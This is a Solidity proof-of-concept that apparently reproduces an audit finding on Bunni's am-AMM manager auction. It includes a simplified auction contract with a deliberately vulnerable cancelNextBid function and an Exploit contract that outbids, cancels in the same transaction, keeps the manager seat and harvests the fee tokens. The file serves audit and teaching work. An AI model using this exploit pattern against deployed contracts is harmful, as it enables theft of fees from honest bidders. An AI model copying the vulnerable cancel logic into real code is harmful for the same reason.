// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Bunni am-AMM — Pashov, August 2024.
    The top-bid manager can post a higher next bid and cancelNextBid it in the
    same transaction, before K epochs promote the real outbidder. The manager
    keeps the seat and harvests the 1000 fee tokens. Leaving the outbid in
    place until K epochs promotes that bidder and pays them the fees.
*/

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory sym) {
        symbol = sym;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract AmAmm {
    struct Bid {
        address manager;
        uint256 rent;
        uint256 deposit;
        uint40 epoch;
    }

    uint256 public constant K = 24;
    Token public bidToken;
    Token public feeToken;
    uint40 public currentEpoch;
    Bid public topBid;
    Bid public nextBid;

    error BidLocked();

    constructor(Token _bid, Token _fee, address topManager, address nextManager, uint40 epoch, bool ready) {
        bidToken = _bid;
        feeToken = _fee;
        currentEpoch = epoch;
        topBid = Bid({manager: topManager, rent: 100, deposit: 365 * K * 100, epoch: epoch});
        uint40 nextEpoch = ready ? epoch - uint40(K) : epoch - uint40(K - 1);
        nextBid = Bid({manager: nextManager, rent: 1 ether, deposit: K * 1 ether, epoch: nextEpoch});
        bidToken.mint(address(this), nextBid.deposit + topBid.deposit);
    }

    function getNextManager() external view returns (address) {
        return nextBid.manager;
    }

    function getTopManager() external view returns (address) {
        return topBid.manager;
    }

    function bid(uint256 rent, uint256 deposit) external {
        require(deposit / rent >= K, "duration");
        require(rent * 100 > topBid.rent * 110, "rent");
        require(rent > nextBid.rent, "not higher");
        require(currentEpoch < nextBid.epoch + K, "already due");
        if (nextBid.manager != address(0)) {
            require(bidToken.transfer(nextBid.manager, nextBid.deposit), "refund prev");
        }
        require(bidToken.transferFrom(msg.sender, address(this), deposit), "pull");
        nextBid = Bid({manager: msg.sender, rent: rent, deposit: deposit, epoch: currentEpoch});
    }

    function cancelNextBid(address recipient) external returns (uint256 refund) {
        if (topBid.manager != address(0) && topBid.deposit / topBid.rent < K) revert BidLocked();
        require(msg.sender == nextBid.manager, "not next");
        refund = nextBid.deposit;
        // @> VULN: cancel clears the next bid before its K-epoch promotion, so the higher bidder never takes the seat
        nextBid.manager = address(0);
        nextBid.deposit = 0;
        nextBid.rent = 0;
        require(bidToken.transfer(recipient, refund), "refund");
    }

    function poke() external {
        if (nextBid.manager != address(0) && currentEpoch >= nextBid.epoch + K && nextBid.rent * 100 > topBid.rent * 110)
        {
            topBid = nextBid;
            nextBid.manager = address(0);
            nextBid.deposit = 0;
        }
    }

    function harvest() external {
        uint256 amt = feeToken.balanceOf(address(this));
        require(feeToken.transfer(topBid.manager, amt), "fees");
    }
}

contract Exploit {
    uint256 public constant FEES = 1000 ether;
    address public constant OUTBIDDER = 0x2222222222222222222222222222222222222222;

    Token public bidToken;
    Token public feeToken;
    AmAmm public amAmm;
    uint256 public harvested;
    uint256 public attackerDeposit = 24 * 111 ether / 100;

    constructor() {
        bidToken = new Token("BID");
        feeToken = new Token("FEE");
        amAmm = new AmAmm(bidToken, feeToken, address(this), OUTBIDDER, 100, false);
        feeToken.mint(address(amAmm), FEES);
        bidToken.mint(address(this), attackerDeposit);
    }

    function run() external {
        bidToken.approve(address(amAmm), attackerDeposit);
        amAmm.bid(111 ether / 100, attackerDeposit);
        address displaced = amAmm.getNextManager();
        amAmm.cancelNextBid(address(this));
        amAmm.harvest();
        harvested = feeToken.balanceOf(address(this));
        require(displaced == address(this), "replaced");
        require(amAmm.getNextManager() == address(0), "cleared");
        require(amAmm.getTopManager() == address(this), "kept");
        require(bidToken.balanceOf(OUTBIDDER) == 24 ether, "refunded");
        require(bidToken.balanceOf(address(this)) == attackerDeposit, "no cost");
        require(harvested == FEES, "fees");
    }
}
